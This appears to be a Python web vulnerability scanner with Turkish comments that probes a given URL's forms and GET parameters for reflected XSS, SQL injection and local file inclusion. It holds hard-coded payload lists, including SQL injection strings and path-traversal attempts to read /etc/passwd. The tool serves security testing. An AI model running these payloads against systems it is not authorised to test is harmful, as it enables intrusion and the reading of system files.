# -*- coding: utf-8 -*-
# Basit Web Güvenlik Açığı Tarayıcısı
# XSS, SQL Injection ve LFI gibi temel zafiyetleri tespit etmeyi amaçlar.
# Eğitim veya yasal test amaçlı kullanılmalıdır.

import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
from datetime import datetime
import sys

# === LOGLAMA FONKSİYONU ===
def log_result(text):
    """Log mesajını hem konsola yazdırır hem de dosyaya kaydeder."""
    with open("scan_results.txt", "a", encoding="utf-8") as f:
        timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
        f.write(f"{timestamp} {text}\n")
    print(text)

# === GLOBAL PAYLOADLAR VE HATALAR ===
XSS_PAYLOAD = "<script>alert('XSS')</script>"

# Hata tabanlı SQLi için payloadlar
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "';--",
    "\" OR \"\"=\"",
    "' OR 'a'='a"
]

# SQLi tespiti için aranacak hata mesajları
SQLI_ERRORS = [
    "you have an error in your sql syntax;",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated"
]

# LFI için payloadlar (/etc/passwd denemeleri)
LFI_PAYLOADS = [
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "/etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd"
]

# === ORTAK YARDIMCI FONKSİYONLAR ===
def get_all_forms(url):
    """Bir URL'deki tüm form etiketlerini çeker."""
    try:
        response = requests.get(url)
        if response.status_code == 200:
            soup = BeautifulSoup(response.content, "html.parser")
            return soup.find_all("form")
        else:
            log_result(f"[-] URL'ye erişilemedi veya hata kodu döndü: {response.status_code}")
            return []
    except requests.exceptions.RequestException as e:
        log_result(f"[-] İstek sırasında hata oluştu: {e}")
        return []

def get_form_details(form):
    """Form etiketinden action, method ve input detaylarını çıkarır."""
    details = {
        "action": form.attrs.get("action"),
        "method": form.attrs.get("method", "get").lower(),
        "inputs": []
    }
    # Input, textarea ve select etiketlerini bul
    for tag in form.find_all(["input", "textarea", "select"]):
        input_type = tag.attrs.get("type", "text")
        name = tag.attrs.get("name")
        value = tag.attrs.get("value", "")

        if name:
            details["inputs"].append({"type": input_type, "name": name, "value": value})
    return details

def submit_form(form_details, url, payload):
    """Verilen form detaylarına göre payload ile formu gönderir."""
    target_url = urljoin(url, form_details["action"])
    data = {}
    for input in form_details["inputs"]:
        input_name = input["name"]
        input_type = input["type"]
        input_value = input["value"]

        # Belirli input tiplerine payload enjekte et
        if input_type in ["text", "search", "url", "tel", "email", "password", "textarea"]:
            data[input_name] = payload
        # Checkbox/radio gibi tiplerin varsayılan değerini kullan veya "on" gönder
        elif input_type in ["checkbox", "radio"]:
             data[input_name] = input_value if input_value else "on"
        # Diğer input tipleri için varsayılan değeri kullan (hidden vb.)
        else:
             data[input_name] = input_value

    log_result(f"[*] Forma gönderiliyor: {target_url} Metot: {form_details['method'].upper()}")

    try:
        if form_details["method"] == "post":
            response = requests.post(target_url, data=data)
        else:
            response = requests.get(target_url, params=data)
        return response
    except requests.exceptions.RequestException as e:
        log_result(f"[-] Form gönderilirken hata oluştu: {e}")
        class ErrorResponse: # Hata durumunda sahte yanıt
            text = f"İstek hatası: {e}"
            status_code = None
        return ErrorResponse()

# === XSS TARAMASI ===
def scan_xss(url):
    """Verilen URL'deki formları XSS payloadı ile test eder."""
    log_result("\n== XSS Taraması ==")
    forms = get_all_forms(url)
    log_result(f"[+] {len(forms)} form bulundu.")

    for i, form in enumerate(forms):
        log_result(f"[*] Form #{i+1} test ediliyor...")
        form_details = get_form_details(form)
        res = submit_form(form_details, url, XSS_PAYLOAD)

        # Yanıtta payloadın doğrudan yansıdığını kontrol et
        if res.text and XSS_PAYLOAD in res.text:
            log_result(f"[!!!] Potansiyel Yansıyan XSS Açığı Bulundu! -> Form #{i+1}")
        else:
            log_result(f"[-] Form #{i+1} güvenli gibi görünüyor.")
    log_result("== XSS Taraması Tamamlandı ==")


# === SQLi TARAMASI ===
def is_sqli_vulnerable(response):
    """Yanıt içeriğinde SQL hata mesajı olup olmadığını kontrol eder."""
    if not response or not response.text:
        return False
    response_text_lower = response.text.lower()
    for error in SQLI_ERRORS:
        if error.lower() in response_text_lower:
            return True
    return False

def test_url_params_sqli(url):
    """URL'nin GET parametrelerini SQLi payloadları ile test eder."""
    log_result("\n== SQLi (GET Parametreleri) Taraması ==")
    try:
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)

        if not qs:
            log_result("[-] URL'de test edilecek GET parametresi bulunamadı.")
            return

        log_result(f"[+] Test edilecek GET parametreleri: {list(qs.keys())}")

        for param in qs:
            log_result(f"[*] Parametre '{param}' test ediliyor...")
            for payload in SQLI_PAYLOADS:
                test_params = qs.copy()
                test_params[param] = payload # Değerleri listeler halinde tutar
                # URLencode kullanmak daha doğru bir yaklaşım olabilir:
                # from urllib.parse import urlencode
                # new_query = urlencode(test_params, doseq=True)
                # test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

                # Mevcut kodun string birleştirme yaklaşımı:
                new_query_string = "&".join([f"{k}={v}" for k, v in test_params.items() for v in (v if isinstance(v, list) else [v]) ])
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query_string}"

                res = requests.get(test_url)

                if is_sqli_vulnerable(res):
                    log_result(f"[!!!] Potansiyel SQL Injection bulundu! -> Parametre: {param}, Payload: {payload}")
                    # break # İlk zafiyet bulunduğunda parametre için diğer payloadları atla

    except requests.exceptions.RequestException as e:
         log_result(f"[-] SQLi (GET) taraması sırasında istek hatası oluştu: {e}")
    except Exception as e:
         log_result(f"[-] SQLi (GET) taraması sırasında beklenmedik hata oluştu: {e}")


def scan_sql_injection(url):
    """Hem GET parametrelerini hem de formları SQLi için test eder."""
    log_result("\n== SQL Injection Taraması ==")
    test_url_params_sqli(url) # GET parametrelerini test et

    log_result("\n== SQLi (Formlar) Taraması ==")
    forms = get_all_forms(url)
    log_result(f"[+] {len(forms)} form bulundu.")

    for i, form in enumerate(forms):
        log_result(f"[*] Form #{i+1} test ediliyor...")
        form_details = get_form_details(form)

        for payload in SQLI_PAYLOADS:
            res = submit_form(form_details, url, payload)

            if is_sqli_vulnerable(res):
                log_result(f"[!!!] Potansiyel SQLi Açığı Bulundu! -> Form #{i+1}, Payload: {payload}")
                break # Formda zafiyet bulunduğunda diğer payloadları atla
    log_result("== SQL Injection Taraması Tamamlandı ==")

# === LFI TARAMASI ===
def detect_lfi(content):
    """İçerikte LFI belirtisi (passwd dosyası stringleri) arar."""
    if not content:
        return False
    content_lower = content.lower()
    return "root:x:0:0" in content_lower or "nologin" in content_lower

def scan_lfi(url):
    """URL'deki GET parametrelerini LFI payloadları ile test eder."""
    log_result("\n== LFI Taraması ==")
    try:
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)

        if not qs:
            log_result("[-] URL'de test edilecek GET parametresi bulunamadı.")
            return

        log_result(f"[+] Test edilecek GET parametreleri: {list(qs.keys())}")

        for param in qs:
            log_result(f"[*] Parametre '{param}' test ediliyor...")
            for payload in LFI_PAYLOADS:
                modified_params = qs.copy()
                modified_params[param] = payload # Değerleri listeler halinde tutar
                # URLencode kullanmak daha doğru olabilir:
                # from urllib.parse import urlencode
                # new_query = urlencode(modified_params, doseq=True)
                # full_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

                # Mevcut kodun string birleştirme yaklaşımı:
                new_query_string = "&".join([f"{k}={v}" for k, v in modified_params.items() for v in (v if isinstance(v, list) else [v]) ])
                full_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query_string}"

                try:
                    res = requests.get(full_url)
                    if res.status_code == 200 and detect_lfi(res.text):
                        log_result(f"[!!!] Potansiyel LFI Açığı Bulundu! -> Parametre: {param}, Payload: {payload}")
                        break # Parametrede zafiyet bulunduğunda diğer payloadları atla
                    elif res.status_code != 200:
                         log_result(f"[-] İstek başarılı değil: {res.status_code}")


                except requests.exceptions.RequestException as e:
                    log_result(f"[!] İstek hatası oluştu: {e}")
                    # Hata durumunda bu payloadı atla

    except Exception as e:
         log_result(f"[-] LFI taraması sırasında beklenmedik hata oluştu: {e}")
    log_result("== LFI Taraması Tamamlandı ==")

# === ANA MENÜ ===
def main():
    """Tarayıcıyı başlatır, URL alır ve menü sunar."""
    # Sonuç dosyasını hazırla
    try:
        with open("scan_results.txt", "w", encoding="utf-8") as f:
            f.write("=== Basit Güvenlik Tarama Raporu ===\n")
            f.write(f"Tarama Başlangıç Zamanı: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("="*40 + "\n")
    except Exception as e:
         print(f"[-] Sonuç dosyası oluşturulurken/temizlenirken hata: {e}")


    print("== Basit Web Güvenlik Açığı Tarayıcı ==")
    url = input("Hedef URL'yi girin: ")

    # URL formatı kontrolü
    if not url.startswith("http://") and not url.startswith("https://"):
        print("[-] Geçersiz URL formatı. Lütfen 'http://' veya 'https://' ile başlayan tam URL girin.")
        sys.exit(1)

    # Menü döngüsü
    while True:
        print("\n--- Tarama Menüsü ---")
        print("1. XSS Tarama")
        print("2. SQL Injection Tarama")
        print("3. LFI Tarama")
        print("4. Tümünü Tara")
        print("0. Çıkış")
        print("-" * 20)

        choice = input("Seçim: ")

        if choice == "1":
            scan_xss(url)
        elif choice == "2":
            scan_sql_injection(url)
        elif choice == "3":
            scan_lfi(url)
        elif choice == "4":
             print("\n[*] Tüm taramalar başlatılıyor...")
             scan_xss(url)
             scan_sql_injection(url)
             scan_lfi(url)
             print("\n[*] Tüm taramalar tamamlandı.")
        elif choice == "0":
            print("Çıkılıyor...")
            break
        else:
            print("Geçersiz seçim.")

    print("Tarama betiği sonlandı.")

# === BETİK BAŞLANGICI ===
if __name__ == "__main__":
    main()
